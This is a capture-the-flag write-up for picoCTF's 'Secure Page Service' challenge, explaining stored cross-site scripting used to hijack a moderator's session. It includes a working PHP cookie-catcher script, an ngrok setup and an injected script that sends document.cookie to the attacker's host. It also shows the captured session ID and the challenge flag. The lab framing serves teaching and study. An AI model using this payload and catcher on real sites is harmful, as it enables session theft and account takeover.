## Secure Page Service

This challenge comes from PicoCTF. We have access to a very simple website with login features that allows users to post comments.

Our goal is to view the page with the id ```43440b22864b30a0098f034eaf940730ca211a55``` which is password locked. Only the site moderator could see this post, so we are to somehow disguise ourselves as the site moderator.
The way we can "pretend" as the site moderator is to hijack their session. Http is a stateless protocol, and the way server identifies individual users is by their cookies. 
If we could steal the moderator's cookie, we can login as the moderator without knowing their password and view the flag. 

In this challenge, we can perform session hijacking with XSS (Cross Site Scripting). When the user input that is directly presented on the webpage (the typical example is online forums) and does not get sanitized, 
it is possible to embed scripts which can be executed upon an access to the webpage (or a click on the link).

The easiest way to check if XSS is possible is by embedding ```<script>alert()</script>```. When we access the page and if the alert pop-up shows up, then
it means the javascript code was successfully executed.

XSS requires the target/victim to access the page or click on the link, which is often the most difficult aspect of XSS. Luckily for this challenge, we can "report" our comment to the moderator: this guarantees that the moderator will view our comment!

So now it all comes down to the code we embed, as well as how to collect the cookie. There are many ways to do this, but one common thing is that we have to set up our own webpage to which we redirect the victim. I chose to set up the webpage using XAMPP with the help of ngrok.
Firstly, set up a webpage named ```cookieCatcher.php```, whose code is shown below
```
<?php
  $cookie = $_GET['cookie'];
  $ip = $_SERVER['REMOTE_ADDR'];
  $date = date('l jS \of F Y h:i:s A');
  $referer = $_SERVER['HTTP_REFERER'];
  $fp = fopen('cookies.html', 'a');
  fwrite($fp, 'Cookie: '.$cookie.'<br> IP: ' .$ip. '<br> Date and Time: ' .$date. '<br> Website: '.$referer.'<br><br><br>');
  fclose($fp);
  header ("javascript:history.back()");
?>
```
Basically, this acquires the victim's cookie (and REMOTE_ADD), and then outputs it to a file named ```cookies.html``` in the same directory. The output file can be a text file too. Put this PHP file in the ```htdocs``` folder. In order for a third party to access this page, we use ```ngrok```. This is a command line tool that creates a temoporary URL with which a third party can access our ```localhost```. 
Start up Apache in XAMPP, and in the command line, type in ```ngrok.exe http 80```. This will output something like
```
Session Status                online
Version                       2.1.18
Region                        United States (us)
Web Interface                 http://127.0.0.1:4040
Forwarding                    http://11465a2b.ngrok.io -> localhost:80
Forwarding                    https://11465a2b.ngrok.io -> localhost:80

Connections                   ttl     opn     rt1     rt5     p50     p90
                              0       0       0.00    0.00    0.00    0.00
```
We are using GET method, so the code that we want to embed is something like ```<script> location.href=("https://11465a2b.ngrok.io/cookieCatcher.php?cookie="document.cookie)</script>. Note that ```document.cookie``` is outside the quotation. This redirects the user to ```cookieCatcher.php``` where we collect their cookie.
Fill out the comment and click on "create". To prevent the script from executing, add a password to this post. Now click on "report to the moderator" button, and check ```cookies.html```.

```
Cookie: PHPSESSID=tc5n2bs46n32oh6u95lqfuftr3
IP: ::1
Date and Time: Sunday 1st of January 2017 05:55:06 AM
Website: http://sps.picoctf.com/view_page.php?page_id=eeff5ac550044e7f3ac738ffb3eb0c0cfb5b9500
```
We see that ```PHPSESSID = tc5n2bs46n32oh6u95lqfuftr3```. This is the session ID of the moderator: note that this is not static, so it will be different every time. Using ```CookieEditor```, a Firefox extension, we can edit our cookie to this value.
Finally, enter the post id ```43440b22864b30a0098f034eaf940730ca211a55```. Without password, we are able to view the page, and it gives out the flag as a javascript alert. The flag is ```wow_cross_site_scripting_is_such_web```




